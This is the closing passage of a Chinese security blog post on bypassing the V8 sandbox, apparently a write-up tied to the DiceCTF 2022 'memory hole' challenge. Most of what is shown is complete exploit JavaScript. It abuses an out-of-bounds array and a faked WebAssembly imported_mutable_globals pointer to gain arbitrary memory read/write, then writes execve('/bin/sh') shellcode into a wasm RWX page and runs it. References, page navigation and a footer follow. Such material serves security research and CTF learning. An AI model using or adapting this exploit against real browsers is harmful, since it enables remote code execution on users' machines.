class="number">0</span>] = l;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.cvt_f64a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    isethtof(i, h) &#123;</span><br><span class="line">      <span class="keyword">this</span>.cvt_u64a[<span class="number">0</span>] = i;</span><br><span class="line">      <span class="keyword">this</span>.cvt_u32a[<span class="number">1</span>] = h;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.cvt_f64a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    isetlhtof(l,h)&#123;</span><br><span class="line">        <span class="keyword">this</span>.cvt_u32a[<span class="number">0</span>] = l;</span><br><span class="line">        <span class="keyword">this</span>.cvt_u32a[<span class="number">1</span>] = h;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.cvt_f64a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    isetltoi(i,l)&#123;</span><br><span class="line">      <span class="keyword">this</span>.cvt_u32a[<span class="number">0</span>] = l;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.cvt_u64a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    isethtoi(i,h)&#123;</span><br><span class="line">      <span class="keyword">this</span>.cvt_u32a[<span class="number">1</span>] = h;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.cvt_u64a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    isetlhtoi(l,h)&#123;</span><br><span class="line">        <span class="keyword">this</span>.cvt_u32a[<span class="number">0</span>] = l;</span><br><span class="line">        <span class="keyword">this</span>.cvt_u32a[<span class="number">1</span>] = h;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.cvt_u64a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    igetl(i) &#123;</span><br><span class="line">      <span class="keyword">this</span>.cvt_u64a[<span class="number">0</span>] = i;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.cvt_u32a[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    igeth(i) &#123;</span><br><span class="line">      <span class="keyword">this</span>.cvt_u64a[<span class="number">0</span>] = i;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>.cvt_u32a[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    gc() &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000000</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    printhex(s, val) &#123;</span><br><span class="line">      <span class="comment">//%DebugPrint(s + " 0x" + val.toString(16));</span></span><br><span class="line">      <span class="built_in">console</span>.log(s + <span class="string">" 0x"</span> + val.toString(<span class="number">16</span>));</span><br><span class="line">      <span class="comment">//document.write(s +' ' + val.toString(16) + " &lt;/br&gt;");</span></span><br><span class="line">      <span class="comment">//alert(s + " 0x" + val.toString(16));</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> helper = <span class="keyword">new</span> Helpers();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> oob_arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">var</span> i64arr= <span class="keyword">new</span> BigUint64Array(buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_imported_mutable_globals_arr = [<span class="number">0x1337133713371337</span>];</span><br><span class="line"><span class="keyword">var</span> leaker = &#123; <span class="string">'x'</span>:fake_imported_mutable_globals_arr&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasm_code = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0x00</span>,<span class="number">0x61</span>,<span class="number">0x73</span>,<span class="number">0x6d</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x09</span>,<span class="number">0x02</span>,<span class="number">0x60</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x7e</span>,<span class="number">0x60</span>,<span class="number">0x01</span>,<span class="number">0x7e</span>,<span class="number">0x00</span>,<span class="number">0x02</span>,<span class="number">0x0e</span>,<span class="number">0x01</span>,<span class="number">0x02</span>,<span class="number">0x6a</span>,<span class="number">0x73</span>,<span class="number">0x06</span>,<span class="number">0x67</span>,<span class="number">0x6c</span>,<span class="number">0x6f</span>,<span class="number">0x62</span>,<span class="number">0x61</span>,<span class="number">0x6c</span>,<span class="number">0x03</span>,<span class="number">0x7e</span>,<span class="number">0x01</span>,<span class="number">0x03</span>,<span class="number">0x03</span>,<span class="number">0x02</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x07</span>,<span class="number">0x19</span>,<span class="number">0x02</span>,<span class="number">0x09</span>,<span class="number">0x67</span>,<span class="number">0x65</span>,<span class="number">0x74</span>,<span class="number">0x47</span>,<span class="number">0x6c</span>,<span class="number">0x6f</span>,<span class="number">0x62</span>,<span class="number">0x61</span>,<span class="number">0x6c</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x09</span>,<span class="number">0x73</span>,<span class="number">0x65</span>,<span class="number">0x74</span>,<span class="number">0x47</span>,<span class="number">0x6c</span>,<span class="number">0x6f</span>,<span class="number">0x62</span>,<span class="number">0x61</span>,<span class="number">0x6c</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x0a</span>,<span class="number">0x0d</span>,<span class="number">0x02</span>,<span class="number">0x04</span>,<span class="number">0x00</span>,<span class="number">0x23</span>,<span class="number">0x00</span>,<span class="number">0x0b</span>,<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x24</span>,<span class="number">0x00</span>,<span class="number">0x0b</span>,<span class="number">0x00</span>,<span class="number">0x14</span>,<span class="number">0x04</span>,<span class="number">0x6e</span>,<span class="number">0x61</span>,<span class="number">0x6d</span>,<span class="number">0x65</span>,<span class="number">0x02</span>,<span class="number">0x07</span>,<span class="number">0x02</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x07</span>,<span class="number">0x04</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x67</span>])</span><br><span class="line"><span class="keyword">var</span> wasm_mod = <span class="keyword">new</span> WebAssembly.Module(wasm_code); </span><br><span class="line"><span class="keyword">const</span> global = <span class="keyword">new</span> WebAssembly.Global(&#123;<span class="attr">value</span>:<span class="string">'i64'</span>, <span class="attr">mutable</span>:<span class="literal">true</span>&#125;, <span class="number">0</span>n);</span><br><span class="line"><span class="keyword">var</span> wasm_instance = <span class="keyword">new</span> WebAssembly.Instance(wasm_mod, &#123;<span class="attr">js</span>:&#123;global&#125;&#125;); </span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> getGlobal= wasm_instance.exports.getGlobal;</span><br><span class="line"><span class="keyword">var</span> setGlobal= wasm_instance.exports.setGlobal;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbWrite</span>(<span class="params">addr,val</span>)</span>&#123;</span><br><span class="line">    oob_arr[<span class="number">0x17</span>] = helper.itof(addr);</span><br><span class="line">    setGlobal(BigInt.asUintN(<span class="number">64</span>,BigInt(val)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbRead</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line">    oob_arr[<span class="number">0x17</span>] = helper.itof(addr);</span><br><span class="line">    <span class="keyword">return</span> BigInt.asUintN(<span class="number">64</span>, getGlobal());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrOf</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">    leaker[<span class="string">'x'</span>] = obj;</span><br><span class="line">    <span class="keyword">return</span> BigInt.asUintN(<span class="number">64</span>,js_base + BigInt(helper.ftoih(oob_arr[<span class="number">0x1b</span>])));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">oob_arr.setLength(<span class="number">0x10000000</span>/<span class="number">8</span>);</span><br><span class="line">dp(oob_arr);</span><br><span class="line">dp(fake_imported_mutable_globals_arr);</span><br><span class="line">dp(leaker);</span><br><span class="line"><span class="comment">// %DebugPrint(i64arr);</span></span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br><span class="line"></span><br><span class="line">oob_arr[<span class="number">0x11</span>] = helper.isethtof(helper.ftoi(oob_arr[<span class="number">0x11</span>]),<span class="number">0x10000000</span>); <span class="comment">// length</span></span><br><span class="line">oob_arr[<span class="number">0x13</span>] = helper.itof(<span class="number">0</span>n); <span class="comment">// external_pointer</span></span><br><span class="line"><span class="comment">// %DebugPrint(i64arr);</span></span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// leak js_base</span></span><br><span class="line"><span class="keyword">var</span> js_base = <span class="number">0</span>n;</span><br><span class="line"><span class="keyword">if</span>( (i64arr[<span class="number">3</span>] &gt;&gt; <span class="number">32</span>n ) == (i64arr[<span class="number">4</span>] &gt;&gt; <span class="number">32</span>n)) &#123;</span><br><span class="line">    js_base = BigInt.asUintN(<span class="number">64</span>,i64arr[<span class="number">3</span>]) &amp; <span class="number">0xffff00000000</span>n;</span><br><span class="line">&#125;</span><br><span class="line">helper.printhex(<span class="string">'js_base @'</span>, js_base);</span><br><span class="line"></span><br><span class="line">fake_imported_mutable_globals_arr_addr = addrOf(fake_imported_mutable_globals_arr);</span><br><span class="line">fake_imported_mutable_globals_addr = fake_imported_mutable_globals_arr_addr - <span class="number">0x9</span>n;</span><br><span class="line"></span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br><span class="line"></span><br><span class="line">oob_arr_addr = addrOf(oob_arr);</span><br><span class="line">wasm_inst_addr = addrOf(wasm_instance);</span><br><span class="line"></span><br><span class="line">imported_mutable_globals_offset = (wasm_inst_addr - js_base + <span class="number">0x50</span>n <span class="number">-1</span>n ) / <span class="number">8</span>n;</span><br><span class="line"></span><br><span class="line">dp(wasm_instance);</span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br><span class="line"></span><br><span class="line">helper.printhex(<span class="string">'fake_obj_addr @'</span>, fake_imported_mutable_globals_addr);</span><br><span class="line">helper.printhex(<span class="string">'oob_arr_addr @'</span>, oob_arr_addr);</span><br><span class="line">helper.printhex(<span class="string">'wasm_instance_addr @'</span>, wasm_inst_addr);</span><br><span class="line">helper.printhex(<span class="string">'wasm_instance.imported_mutable_globals_offset '</span>, imported_mutable_globals_offset);</span><br><span class="line"></span><br><span class="line"><span class="comment">// i64arr[imported_mutable_globals_offset] = helper.isethtoi(i64arr[imported_mutable_globals_offset] , Number(fake_imported_mutable_globals_addr &amp; 0xffffffffn));</span></span><br><span class="line"><span class="comment">// i64arr[imported_mutable_globals_offset + 1n] = helper.isetltoi(i64arr[imported_mutable_globals_offset + 1n], Number(fake_imported_mutable_globals_addr &gt;&gt; 32n));</span></span><br><span class="line">helper.printhex(<span class="string">'i64arr[globals_offset] @'</span>, i64arr[imported_mutable_globals_offset]);</span><br><span class="line">i64arr[imported_mutable_globals_offset] = fake_imported_mutable_globals_addr;</span><br><span class="line"></span><br><span class="line">dp(wasm_instance);</span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasm_code2= <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([</span><br><span class="line"><span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>,</span><br><span class="line"><span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"><span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>,</span><br><span class="line"><span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>,</span><br><span class="line"><span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"><span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span>,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasm_mod2 = <span class="keyword">new</span> WebAssembly.Module(wasm_code2);</span><br><span class="line"><span class="keyword">var</span> wasm_instance2 = <span class="keyword">new</span> WebAssembly.Instance(wasm_mod2);</span><br><span class="line"><span class="keyword">var</span> f = wasm_instance2.exports.main;</span><br><span class="line"></span><br><span class="line">wasm_instance2_addr = addrOf(wasm_instance2);</span><br><span class="line"></span><br><span class="line">wasm_instance2_rwx_page_addr = wasm_instance2_addr + <span class="number">0x60</span>n - <span class="number">1</span>n;</span><br><span class="line">helper.printhex(<span class="string">'rwx page addr @'</span>, wasm_instance2_rwx_page_addr);</span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br><span class="line">wasm_instance2_rwx_page = arbRead(wasm_instance2_rwx_page_addr);</span><br><span class="line">helper.printhex(<span class="string">'rwx page @'</span>, wasm_instance2_rwx_page);</span><br><span class="line"></span><br><span class="line">shellcode = [<span class="number">0x99583b6a</span>, <span class="number">0x622fbb48</span>, <span class="number">0x732f6e69</span>, <span class="number">0x48530068</span>, <span class="number">0x2d68e789</span>, <span class="number">0x48000063</span>, <span class="number">0xe852e689</span>, <span class="number">0x00000008</span>,</span><br><span class="line"><span class="number">0x6e69622f</span>, <span class="number">0x0068732f</span>, <span class="number">0x89485756</span>, <span class="number">0x00050fe6</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;shellcode.length; i=i+<span class="number">2</span>)&#123;</span><br><span class="line">    arbWrite(wasm_instance2_rwx_page +(BigInt(i) * <span class="number">4</span>n),helper.isetlhtoi(shellcode[i],shellcode[i+<span class="number">1</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// dp(wasm_instance2);</span></span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br><span class="line"></span><br><span class="line">f();</span><br></pre></td></tr></table></figure>
<p><img src="/2022/02/27/v8-sandbox-escape/Untitled%2014.png" alt="Untitled"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html" target="_blank" rel="noopener">https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html</a></li>
<li><a href="https://blog.kylebot.net/2022/02/06/DiceCTF-2022-memory-hole/" target="_blank" rel="noopener">https://blog.kylebot.net/2022/02/06/DiceCTF-2022-memory-hole/</a></li>
<li><a href="https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit#" target="_blank" rel="noopener">https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit#</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/WebAssembly/Global/Global" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/WebAssembly/Global/Global</a></li>
<li><a href="https://developer.mozilla.org/zh-CN/docs/WebAssembly/Understanding_the_text_format" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/WebAssembly/Understanding_the_text_format</a></li>
<li><a href="https://github.com/mdn/webassembly-examples/blob/master/js-api-examples/global.wat" target="_blank" rel="noopener">https://github.com/mdn/webassembly-examples/blob/master/js-api-examples/global.wat</a></li>
</ul>

      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a href="">V8 沙盒绕过</a></p>
        <p><span>文章作者:</span><a href="/" title="回到主页">Jayl1n</a></p>
        <p><span>发布时间:</span>2022-02-27, 11:17:27</p>
        <p><span>最后更新:</span>2023-08-16, 23:16:43</p>
        <p>
            <span>原始链接:</span><a class="post-url" href="" title="V8 沙盒绕过">https://jayl1n.github.io/2022/02/27/v8-sandbox-escape/</a>
            <span class="copy-path" data-clipboard-text="原文: https://jayl1n.github.io/2022/02/27/v8-sandbox-escape/　　作者: Jayl1n" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>



    <nav id="article-nav">
        
        
            <div id="article-nav-older" class="article-nav-title">
                <a href="../../../../2021/10/05/pentest-gb28181-attack/">
                    GB28181 的一点小问题
                </a>
            </div>
        
    </nav>

  
</article>

    <div id="toc" class="toc-article">
        <strong class="toc-title">文章目录</strong>
        
            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#V8-沙箱绕过"><span class="toc-number">1.</span> <span class="toc-text">V8 沙箱绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#指针压缩"><span class="toc-number">2.</span> <span class="toc-text">指针压缩</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#V8-沙箱"><span class="toc-number">3.</span> <span class="toc-text">V8 沙箱</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#绕过"><span class="toc-number">4.</span> <span class="toc-text">绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#方法一：利用立即数写-shellcode"><span class="toc-number">4.1.</span> <span class="toc-text">方法一：利用立即数写 shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JSFunction"><span class="toc-number">4.1.1.</span> <span class="toc-text">JSFunction</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用立即数构造-shellcode"><span class="toc-number">4.1.2.</span> <span class="toc-text">使用立即数构造 shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#执行"><span class="toc-number">4.1.3.</span> <span class="toc-text">执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">4.1.4.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#方法二：利用-WasmInstance-的全局变量"><span class="toc-number">4.2.</span> <span class="toc-text">方法二：利用 WasmInstance 的全局变量</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#全局变量"><span class="toc-number">4.2.1.</span> <span class="toc-text">全局变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用全局变量"><span class="toc-number">4.2.2.</span> <span class="toc-text">使用全局变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#伪造-imported-mutable-globals"><span class="toc-number">4.2.3.</span> <span class="toc-text">伪造 imported_mutable_globals</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取基址-js-base"><span class="toc-number">4.2.4.</span> <span class="toc-text">获取基址 js_base</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修改全局变量"><span class="toc-number">4.2.5.</span> <span class="toc-text">修改全局变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-1"><span class="toc-number">4.2.6.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
        
    </div>
    <style>
        .left-col .switch-btn,
        .left-col .switch-area {
            display: none;
        }
        .toc-level-3 i,
        .toc-level-3 ol {
            display: none !important;
        }
    </style>

    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">

    <script>
        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
    </script>



    
<div class="share">
    
        <div class="bdsharebuttonbox">
            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
        </div>
        <script>
            window._bd_share_config={
                "common":{"bdSnsKey":{},"bdText":"V8 沙盒绕过　| Jayl1n's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
        </script>
    

    
</div>







    
        <section id="comments">
    <style> aside.comment-bar { margin: auto 30px; }</style>
    <div id="disqus_thread"></div>
    <script>
        var disqus_config = function(){
            this.page.url = 'https://jayl1n.github.io/2022/02/27/v8-sandbox-escape/';
            this.page.identifier = '2022/02/27/v8-sandbox-escape/';
        };
        var loadComment = function(){
            var d = document, s = d.createElement('script');
            s.src = '//jayl1n-github-io.disqus.com/embed.js';
            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        }
    </script>
    
    <script> loadComment(); </script>

</section>


    




    <div class="scroll" id="post-nav-button">
        
            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
        

        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>

        
            <a href="../../../../2021/10/05/pentest-gb28181-attack/" title="下一篇: GB28181 的一点小问题">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>

    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="">V8 沙盒绕过</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2021/10/05/pentest-gb28181-attack/">GB28181 的一点小问题</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2021/07/07/realpwn-heap-spary-exercise/">【RealPwn-2】 堆喷练习</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2021/07/04/realpwn-vtable-hijacking-exercise/">【RealPwn-1】 虚函数表劫持练习</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2021/07/01/use-inlinehook-technology-to-make-a-more-general-webshell/">利用 Hook 技术打造通用的 Webshell</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2021/06/23/compile-v8-on-windows10/">在 Win10 上编译 V8 引擎</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2021/02/05/antiav-jsp-webshell/">JSP免杀 —— 绕过智能AI？</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2021/01/03/compile-virtualbox-on-macos10-15/">MacOS 下编译 VirtualBox</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/04/10/pentest-cobaltstrike-improve/">魔改 CobaltStrike 3.14 实现域前置自定义端口</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/02/13/java-nohup-implementation/">Java 实现后台执行</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/01/04/happy-new-year-2020/">2020 大家新年快乐鸭</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/06/26/sctf-2019-babyEoP-Writeup/">SCTF2019 babyEoP Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/03/29/pentest-getpassword/">Windows下抓取明文密码</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/01/08/tools-load-shellcode/">【GSL】 从内存加载 SHELLCODE 绕过AV查杀</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/12/30/java-audit-step-by-step-4/">从1开始的Java代码审计·第四弹·SSRF</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/11/15/java-audit-step-by-step-3/">从1开始的Java代码审计·第三弹·SQL注入</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/10/29/java-audit-step-by-step-2/">从1开始的Java代码审计·第二弹·基础篇（下）</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/10/25/java-audit-step-by-step-1/">从1开始的Java代码审计·第一弹·基础篇（上）</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/10/25/java-audit-step-by-step-0/">从1开始的Java代码审计·序</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/10/05/pentest-20181005/">渗透日记-20181005</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/09/18/summary-command-execution/">PHP中的命令执行</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/09/11/ichunqiu-web-BLOG/">i春秋-Web-BLOG</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/09/10/ichunqiu-web-SQLi/">i春秋-Web-SQLi</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/09/09/daily-life-20180909/">日常心路-180909</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/08/01/crawl-admin5/">爬虫之批量下载Admin5源码</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/07/31/yesterday-and-tomorrow/">昨天，明天</a></li></ul>




    <script>
        
    </script>
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                <i class="fa fa-copyright"></i> 
                2018-2023 Jayl1n
            </div>
            <div class="footer-right">
                <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>| </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>

<script>
    var now = new Date(); 
    function createtime() { 
        var grt= new Date("07/31/2018 00:00:00");//此处修改你的建站时间或者网站上线时间 
        now.setTime(now.getTime()+250); 
        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
        document.getElementById("timeDate").innerHTML = "本站已运行 "+dnum+" 天 "; 
        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
    } 
setInterval("createtime()",250);
</script>
    </div>
    
<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>

    <script>
        $(document).ready(function() {
            var iPad = window.navigator.userAgent.indexOf('iPad');
            if (iPad > -1 || $(".left-col").css("display") === "none") {
